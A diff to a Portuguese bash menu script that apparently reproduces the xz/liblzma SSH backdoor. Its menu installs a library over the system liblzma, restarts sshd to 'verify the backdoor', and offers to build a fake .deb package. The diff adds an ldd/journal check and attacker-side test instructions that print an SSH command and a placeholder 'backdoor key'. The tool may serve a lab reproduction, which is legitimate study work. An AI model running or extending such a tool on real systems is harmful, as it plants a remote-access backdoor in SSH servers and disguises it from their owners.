@@ -62,8 +62,9 @@ menu_principal(){
   echo " 3) Compilar bibliotecas (estática + compartilhada)"
   echo " 4) Instalar sobrescrevendo liblzma do sistema"
   echo " 5) Reiniciar SSH e verificar backdoor"
-  echo " 6) Gerar arquivo .deb falso (opcional)"
-  echo " 7) Sair"
+  echo " 6) Verificação técnica (LDD + Journal)"
+  echo " 7) Gerar arquivo .deb falso (opcional)"
+  echo " 8) Sair"
   printf "\nEscolha: "; read -r opt
   case $opt in
     1) f_download;;
@@ -71,8 +72,9 @@ menu_principal(){
     3) f_compile;;
     4) f_install;;
     5) f_restart_ssh;;
-    6) f_deb_fake;;
-    7) exit 0;;
+    6) f_verify;;
+    7) f_deb_fake;;
+    8) exit 0;;
     *) warn "Opção inválida"; sleep 1; menu_principal;;
   esac
 }
@@ -172,12 +174,39 @@ f_restart_ssh(){
   msg "Reiniciando serviço: $ssh_svc"
   systemctl enable "$ssh_svc" || true
   systemctl restart "$ssh_svc" || die "Falha ao restartar $ssh_svc"
-  ok "SSH ($ssh_svc) reiniciado e habilitado. Teste com: ssh usuario@localhost"
-  echo "Use a chave mágica:"
+  ok "SSH ($ssh_svc) reiniciado e habilitado."
+  
+  echo -e "\n${BLUE}================ INSTRUÇÕES DE TESTE ==================${NC}"
+  echo "1. No seu host (atacante), execute:"
+  echo -e "   ${YELLOW}ssh -o \"PubkeyAuthentication=yes\" usuario@$(hostname -I | awk '{print $1}') ${NC}"
+  echo -e "\n2. Use a chave mágica (payload):"
   echo "-----BEGIN OPENSSH BACKDOOR KEY-----"
   echo "AAAAE2VjZS5waHA6Ly8vanVzdC1hLXRlc3QtY2Fsb"
   echo "-----END OPENSSH BACKDOOR KEY-----"
+  echo -e "${BLUE}=======================================================${NC}\n"
+  
   sleep 5
+  menu_principal
+}
+
+# ------------ 6) verificação técnica ------------
+f_verify(){
+  msg "Verificando dependência da liblzma no sshd..."
+  local sshd_path
+  sshd_path=$(command -v sshd || echo "/usr/sbin/sshd")
+  
+  if [[ -f "$sshd_path" ]]; then
+    ldd "$sshd_path" | grep liblzma || warn "liblzma não encontrada no sshd"
+  else
+    warn "Binário sshd não encontrado para verificação LDD"
+  fi
+
+  msg "Logs recentes do SSH (últimas 10 linhas):"
+  local ssh_svc="ssh"
+  systemctl list-unit-files | grep -q "^sshd.service" && ssh_svc="sshd"
+  journalctl -u "$ssh_svc" -n 10 --no-pager || true
+  
+  printf "\n${YELLOW}Pressione ENTER para voltar ao menu...${NC}"; read -r
   menu_principal
 }
 
